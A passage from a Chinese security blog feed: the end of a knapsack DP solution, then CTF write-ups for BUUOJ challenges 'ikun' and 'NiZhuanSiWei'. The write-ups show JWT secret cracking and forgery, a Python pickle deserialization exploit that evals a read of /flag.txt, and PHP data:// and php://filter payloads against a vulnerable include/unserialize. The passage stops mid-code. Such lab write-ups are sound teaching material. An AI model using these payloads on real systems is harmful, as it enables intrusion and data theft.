punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>j<span class="token operator">&lt;=</span>T<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>j<span class="token operator">-</span>t<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>T<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//è¦ä»æ‰€æœ‰å€¼ä¸­æ‰¾å‡ºæœ€å¤§å€¼</span>    <span class="token punctuation">{</span>        ans<span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>ans<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>ä»Šå¤©å°±å…ˆè®°å½•è¿™ä¹ˆå¤šï¼Œä»¥åæœ‰æ—¶é—´åœ¨è®°å½•</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŠ¨æ€è§„åˆ’ </tag>
            
            <tag> C </tag>
            
            <tag> èƒŒåŒ…é—®é¢˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun</title>
      <link href="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/"/>
      <url>/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/</url>
      
        <content type="html"><![CDATA[<p>æ‰“å¼€ç¯å¢ƒï¼Œå–œé—»ä¹è§<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/1.jpg" alt=""></p><a id="more"></a><p>å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/3.jpg" alt=""><br>ç„¶åæ‰¾ä¸€æ‰¾ä¿¡æ¯<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/2.jpg" alt=""><br>è¦æ‰¾åˆ°lv6<br>å¾€ä¸‹ç¿»äº†å‡ é¡µï¼Œå¥½æƒ³æŒºå¤šé¡µçš„æ ·å­ï¼Œæ‰‹å·¥æ‰¾ä¸å‡ºæ¥ï¼Œå†™ä¸ªè„šæœ¬å§</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://63d2c3fa-95be-449a-afe2-1e07c97c0013.node3.buuoj.cn/shop?page=%d"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    u <span class="token operator">=</span> url <span class="token operator">%</span> i    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"æ­£åœ¨æµ‹è¯•ç¬¬%dé¡µ"</span><span class="token operator">%</span>i<span class="token punctuation">)</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>u<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'lv6.png'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"lv6åœ¨ç¬¬%dé¡µ"</span><span class="token operator">%</span>i<span class="token punctuation">)</span>        <span class="token keyword">break</span></code></pre><p><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/4.jpg" alt=""><br>æ‰¾åˆ°lv6åœ¨181é¡µ<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/5.jpg" alt=""><br>è´­ä¹°<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/6.jpg" alt=""><br>å¥½åƒä¹°ä¸èµ·çš„æ ·å­<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/7.jpg" alt=""><br>æœç„¶ä¹°ä¸èµ·<br>é‚£å¼€ç€burpçœ‹çœ‹è¯·æ±‚<br>æ³¨æ„åˆ°æœ‰ä¸€ä¸ªdiscountæŠ˜æ‰£å­—æ ·<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/8.jpg" alt=""><br>é‚£æŠŠæŠ˜æ‰£æ”¹æˆ0è¯•ä¸€ä¸‹<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/9.jpg" alt=""><br>æ“ä½œå¤±è´¥<br>é‚£æŠŠæŠ˜æ‰£æ”¹ä¸ºä¸ä¸º0çš„å¾ˆå°çš„æ•°å­—è¯•è¯•<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/10.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/11.jpg" alt=""><br>è´­ä¹°æˆåŠŸåˆ°äº†å¦ä¸€ä¸ªé¡µé¢ï¼Œæ˜¾ç¤ºåªå…è®¸adminè®¿é—®<br>å¯èƒ½å’Œcookieä¹‹ç±»çš„æœ‰å…³ï¼Œå†æ¬¡è®¿é—®æŠ“åŒ…<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/12.jpg" alt=""><br>æ³¨æ„åˆ°æœ‰ä¸€ä¸ªJWTå­—æ®µ</p><pre class=" language-bash"><code class="language-bash">Json web token <span class="token punctuation">(</span>JWT<span class="token punctuation">)</span>, æ˜¯ä¸ºäº†åœ¨ç½‘ç»œåº”ç”¨ç¯å¢ƒé—´ä¼ é€’å£°æ˜è€Œæ‰§è¡Œçš„ä¸€ç§åŸºäºJSONçš„å¼€æ”¾æ ‡å‡†ï¼ˆ<span class="token punctuation">(</span>RFC 7519<span class="token punctuation">)</span>.è¯¥tokenè¢«è®¾è®¡ä¸ºç´§å‡‘ä¸”å®‰å…¨çš„ï¼Œç‰¹åˆ«é€‚ç”¨äºåˆ†å¸ƒå¼ç«™ç‚¹çš„å•ç‚¹ç™»å½•ï¼ˆSSOï¼‰åœºæ™¯ã€‚JWTçš„å£°æ˜ä¸€èˆ¬è¢«ç”¨æ¥åœ¨èº«ä»½æä¾›è€…å’ŒæœåŠ¡æä¾›è€…é—´ä¼ é€’è¢«è®¤è¯çš„ç”¨æˆ·èº«ä»½ä¿¡æ¯ï¼Œä»¥ä¾¿äºä»èµ„æºæœåŠ¡å™¨è·å–èµ„æºï¼Œä¹Ÿå¯ä»¥å¢åŠ ä¸€äº›é¢å¤–çš„å…¶å®ƒä¸šåŠ¡é€»è¾‘æ‰€å¿…é¡»çš„å£°æ˜ä¿¡æ¯ï¼Œè¯¥tokenä¹Ÿå¯ç›´æ¥è¢«ç”¨äºè®¤è¯ï¼Œä¹Ÿå¯è¢«åŠ å¯†</code></pre><p>ä¸€ç§tokenï¼Œç”¨æ¥è®¤è¯çš„</p><pre class=" language-bash"><code class="language-bash">JWTçš„æ„æˆç¬¬ä¸€éƒ¨åˆ†æˆ‘ä»¬ç§°å®ƒä¸ºå¤´éƒ¨ï¼ˆheader<span class="token punctuation">)</span>,ç¬¬äºŒéƒ¨åˆ†æˆ‘ä»¬ç§°å…¶ä¸ºè½½è·ï¼ˆpayload, ç±»ä¼¼äºé£æœºä¸Šæ‰¿è½½çš„ç‰©å“<span class="token punctuation">)</span>ï¼Œç¬¬ä¸‰éƒ¨åˆ†æ˜¯ç­¾è¯ï¼ˆsignature<span class="token punctuation">)</span>.</code></pre><p>æ•´ä½“å°±å·®ä¸å¤šæ˜¯è¿™æ ·<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/13.jpg" alt=""><br>ä¸è¿‡JWTå¯ä»¥ç ´è§£ï¼Œpythonä¸­çš„pyjwtæ¨¡å—ç­‰ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬ç”¨<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker</a>è¿™ä¸ªå·¥å…·ç ´è§£<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/14.jpg" alt=""><br>ç ´è§£å¾ˆå¿«ï¼ŒåŠ å¯†å¯†é’¥å°±æ˜¯1Kun<br>ç„¶åæˆ‘ä»¬åˆ°è¿™ä¸ªç½‘ç«™å»è¿›è¡Œåœ¨çº¿åŠ å¯†<a href="https://jwt.io/" target="_blank" rel="noopener"></a><br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/15.jpg" alt=""><br>æŠŠå¯†é’¥æ›¿æ¢ä¸º1Kunï¼Œç”¨æˆ·åæ›¿æ¢ä¸ºadminï¼Œå°†æ–°çš„JWTæ›¿æ¢åˆ°æˆ‘ä»¬çš„è¯·æ±‚ä¿¡æ¯å½“ä¸­<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/16.jpg" alt=""><br>æˆåŠŸä»¥adminèº«ä»½ç™»å½•<br>æŸ¥çœ‹é¡µé¢æºä»£ç <br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/17.jpg" alt=""><br>å‘ç°äº†ä¸€ä¸ªå‹ç¼©æ–‡ä»¶ï¼Œä¸‹è½½æ¥çœ‹çœ‹<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/18.jpg" alt=""><br>æ˜¯è¿™ä¸ªç½‘ç«™çš„æºä»£ç <br>åˆåˆ°äº†å¤´ç–¼çš„ä»£ç å®¡è®¡ç¯èŠ‚ã€‚ã€‚ã€‚<br>æŒ¨ä¸ªæŒ¨ä¸ªçœ‹å§</p><hr><p>å¥½å§å®åœ¨å®¡ä¸æ¥ï¼Œçœ‹wpå§<br>æœ‰ä¸€ä¸ªpythonååºåˆ—åŒ–æ¼æ´ï¼Œåœ¨Admin.py </p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> tornado<span class="token punctuation">.</span>web<span class="token keyword">from</span> sshop<span class="token punctuation">.</span>base <span class="token keyword">import</span> BaseHandler<span class="token keyword">import</span> pickle<span class="token keyword">import</span> urllib<span class="token keyword">class</span> <span class="token class-name">AdminHandler</span><span class="token punctuation">(</span>BaseHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    @tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>authenticated    <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>current_user <span class="token operator">==</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span><span class="token string">'This is Black Technology!'</span><span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'no_ass.html'</span><span class="token punctuation">)</span>    @tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>authenticated    <span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            become <span class="token operator">=</span> self<span class="token punctuation">.</span>get_argument<span class="token punctuation">(</span><span class="token string">'become'</span><span class="token punctuation">)</span>            p <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>become<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span>p<span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span><span class="token string">'This is Black Technology!'</span><span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><p>æ¼æ´ä»£ç å‡ºç°åœ¨è¿™é‡Œ</p><pre class=" language-python"><code class="language-python">become <span class="token operator">=</span> self<span class="token punctuation">.</span>get_argument<span class="token punctuation">(</span><span class="token string">'become'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>become<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>å…³äºpythonååºåˆ—åŒ–æ¼æ´å¯ä»¥çœ‹çœ‹è¿™ç¯‡æ–‡ç« <a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">ä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£æ¼æ´ä¹‹ Python ååºåˆ—åŒ–æ¼æ´</a></p><pre class=" language-bash"><code class="language-bash">å½“åºåˆ—åŒ–ä»¥åŠååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ä¸­ç¢°åˆ°ä¸€æ— æ‰€çŸ¥çš„æ‰©å±•ç±»å‹<span class="token punctuation">(</span>è¿™é‡ŒæŒ‡çš„å°±æ˜¯æ–°å¼ç±»<span class="token punctuation">)</span>çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡ç±»ä¸­å®šä¹‰çš„__reduce__æ–¹æ³•æ¥å‘ŠçŸ¥å¦‚ä½•è¿›è¡Œåºåˆ—åŒ–æˆ–è€…ååºåˆ—åŒ–ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ï¼Œåªè¦åœ¨æ–°å¼ç±»ä¸­å®šä¹‰ä¸€ä¸ª __reduce__ æ–¹æ³•ï¼Œæˆ‘ä»¬å°±èƒ½åœ¨åºåˆ—åŒ–çš„ä½¿ç”¨è®©è¿™ä¸ªç±»æ ¹æ®æˆ‘ä»¬åœ¨__reduce__ ä¸­æŒ‡å®šçš„æ–¹å¼è¿›è¡Œåºåˆ—åŒ–ï¼Œé‚£è¿™å°±éå¸¸å¥½ï¼Œé‚£æˆ‘ä»¬è¯¥å¦‚ä½•æŒ‡å®šå‘¢ï¼Ÿå®é™…ä¸Šå…³é”®å°±åœ¨è¿™ä¸ªæ–¹æ³•çš„è¿”å›å€¼ä¸Šï¼Œè¿™ä¸ªæ–¹æ³•å¯ä»¥è¿”å›ä¸¤ç§ç±»å‹çš„å€¼ï¼ŒString å’Œ tuple ,æˆ‘ä»¬çš„æ„é€ ç‚¹å°±åœ¨ä»¤å…¶è¿”å› tuple çš„æ—¶å€™å½“ä»–è¿”å›å€¼æ˜¯ä¸€ä¸ªå…ƒç¥–çš„æ—¶å€™ï¼Œå¯ä»¥æä¾›2åˆ°5ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬é‡ç‚¹åˆ©ç”¨çš„æ˜¯å‰ä¸¤ä¸ªï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªcallable object<span class="token punctuation">(</span>å¯è°ƒç”¨çš„å¯¹è±¡<span class="token punctuation">)</span>ï¼Œç¬¬äºŒä¸ªå‚æ•°å¯ä»¥æ˜¯ä¸€ä¸ªå…ƒç¥–ä¸ºè¿™ä¸ªå¯è°ƒç”¨å¯¹è±¡æä¾›å¿…è¦çš„å‚æ•°ï¼Œå¦‚æœä½ è®¤çœŸçœ‹ä¸Šé¢çš„ PVM çš„æŒ‡ä»¤ç ï¼Œä½ å°±ä¼šå‘ç°è¿™ä¸ªè¿”å›å€¼å’Œå…¶ä¸­çš„ä¸€ä¸ª R æŒ‡ä»¤éå¸¸çš„ä¸€è‡´ï¼Œï¼ˆæˆ‘çŒœæµ‹è¿™ä¸ª R æŒ‡ä»¤ç å°±æ˜¯è¿™ä¸ª __reduce__ æ–¹æ³•çš„è¿”å›å€¼çš„åº•å±‚å®ç° ï¼‰</code></pre><pre class=" language-bash"><code class="language-bash">urllib.unquote<span class="token punctuation">(</span><span class="token punctuation">)</span>å­—ç¬¦ä¸²è¢«å½“ä½œurlæäº¤æ—¶ä¼šè¢«è‡ªåŠ¨è¿›è¡Œurlç¼–ç å¤„ç†pickle.dump<span class="token punctuation">(</span>obj, file<span class="token punctuation">[</span>, protocol<span class="token punctuation">]</span><span class="token punctuation">)</span>åºåˆ—åŒ–å¯¹è±¡ï¼Œå¹¶å°†ç»“æœæ•°æ®æµå†™å…¥åˆ°æ–‡ä»¶å¯¹è±¡ä¸­ã€‚å‚æ•°protocolæ˜¯åºåˆ—åŒ–æ¨¡å¼ï¼Œé»˜è®¤å€¼ä¸º0ï¼Œè¡¨ç¤ºä»¥æ–‡æœ¬çš„å½¢å¼åºåˆ—åŒ–ã€‚protocolçš„å€¼è¿˜å¯ä»¥æ˜¯1æˆ–2ï¼Œè¡¨ç¤ºä»¥äºŒè¿›åˆ¶çš„å½¢å¼åºåˆ—åŒ–ã€‚pickle.load<span class="token punctuation">(</span>file<span class="token punctuation">)</span>ååºåˆ—åŒ–å¯¹è±¡ã€‚å°†æ–‡ä»¶ä¸­çš„æ•°æ®è§£æä¸ºä¸€ä¸ªPythonå¯¹è±¡ã€‚</code></pre><p>expå¦‚ä¸‹(è¦åœ¨python2ä¸‹è¿è¡Œ)</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> urllib<span class="token keyword">class</span> <span class="token class-name">payload</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token keyword">return</span> <span class="token punctuation">(</span>eval<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"open('/flag.txt','r').read()"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span> a</code></pre><p>å†å°†aä¼ ç»™becomeå³å¯<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/19.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/20.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pythonååºåˆ—åŒ– </tag>
            
            <tag> pickleï¼ŒWeb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[ZJCTF 2019]NiZhuanSiWei</title>
      <link href="/LawlietLW.github.io/2020/02/10/zjctf-2019-nizhuansiwei/"/>
      <url>/LawlietLW.github.io/2020/02/10/zjctf-2019-nizhuansiwei/</url>
      
        <content type="html"><![CDATA[<p>æ‰“å¼€ç¯å¢ƒï¼Œç›´æ¥ç»™å‡ºäº†æºä»£ç </p><a id="more"></a><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string">"welcome to the zjctf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;h1>"</span><span class="token punctuation">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/h1>&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Not now!"</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//useless.php</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>å®¡è®¡æºä»£ç <br>å¯ä»¥ä¼ å…¥text,fileå’Œpasswordå‚æ•°ï¼Œfileå‚æ•°éœ€è¦æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œä¸”æ–‡ä»¶å†…å®¹ä¸ºâ€welcome to the zjctfâ€<br>ç”¨file_get_contentsè¯»å–fileå‚æ•°<br><a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/#data" target="_blank" rel="noopener">æ–‡ä»¶åŒ…å«æ¼æ´ä¸phpä¼ªåè®®</a><br>æˆ‘ä»¬å¯ä»¥ç”¨data://ä¼ªåè®®å°†å†…å®¹å†™ç„¶åå†è®©file_get_contentsè¯»å–<br>payload:</p><pre class=" language-bash"><code class="language-bash">http://89071de8-6fdf-46b3-877a-fc3da9efac70.node3.buuoj.cn/?text<span class="token operator">=</span>data://text/plain<span class="token punctuation">;</span>base64,d2VsY29tZSB0byB0aGUgempjdGY<span class="token operator">=</span></code></pre><p><img src="/LawlietLW.github.io/2020/02/10/zjctf-2019-nizhuansiwei/1.jpg" alt=""><br>å¾€åçœ‹<br>fileä¼šè¢«includeï¼Œä½†flagè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç›´æ¥åŒ…å«flag.php<br>ä½†ç»™äº†æç¤ºæœ‰useless.php,é‚£æˆ‘ä»¬å°±åŒ…å«useless.php<br>å¯ä»¥ç”¨php://filterä¼ªåè®®è¯»å–useless.phpçš„æºä»£ç <br>payload:</p><pre class=" language-bash"><code class="language-bash">http://89071de8-6fdf-46b3-877a-fc3da9efac70.node3.buuoj.cn/?text<span class="token operator">=</span>data://text/plain<span class="token punctuation">;</span>base64,d2VsY29tZSB0byB0aGUgempjdGY<span class="token operator">=</span><span class="token operator">&amp;</span>file<span class="token operator">=</span>php://filter/convert.base64-encode/resource<span class="token operator">=</span>useless.php</code></pre><p><img src="/LawlietLW.github.io/2020/02/10/zjctf-2019-nizhuansiwei/2.jpg" alt=""><br>å°†å¾—åˆ°çš„base64å­—ç¬¦ä¸²è§£ç </p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//flag.php  </span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>              <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>"U R <span class="token constant">SO</span> <span class="token constant">CLOSE</span> <span class="token operator">!</span><span class="token comment" spellcheck="true">///COME ON PLZ");</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token delimiter">?></span>  </code></pre><p>å®¡è®¡ä»£ç <br>å®šä¹‰äº†Flagç±»ï¼Œæœ‰ä¸€ä¸ªfileå±æ€§<br>__tostring()é­”æœ¯æ–¹æ³•ä¼šè¯»å–fileçš„å†…å®¹</p><p>å†çœ‹åˆ°ä¹‹å‰çš„ä»£ç </p><pre class=" language-php"><code class="language-php"><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$password</span><span class="token punctuation">;</span></code></pre><p>è¾“å‡ºååºåˆ—åŒ–ä¹‹åçš„passwordå‚æ•°<br>æ®æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å°†Flagç±»çš„fileå±æ€§è®¾ç½®ä¸ºflag.phpï¼Œç„¶åä¼ å…¥passwordå‚æ•°å³å¯</p><pre class=" language-php"><code class="language-php"><span class="token 